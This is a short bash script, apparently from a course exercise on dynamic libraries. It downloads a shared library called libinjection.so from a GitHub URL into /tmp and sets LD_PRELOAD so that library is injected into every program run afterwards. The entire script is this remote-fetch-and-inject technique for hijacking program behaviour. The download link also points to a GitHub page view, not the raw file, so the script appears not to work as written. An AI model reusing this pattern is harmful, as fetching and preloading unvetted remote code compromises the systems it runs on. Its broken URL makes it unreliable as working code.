#!/bin/bash
wget -O /tmp/libinjection.so https://github.com/Abrsh21/alx-low_level_programming/blob/main/0x18-dynamic_libraries/libinjection.so 
export LD_PRELOAD=/tmp/libinjection.so
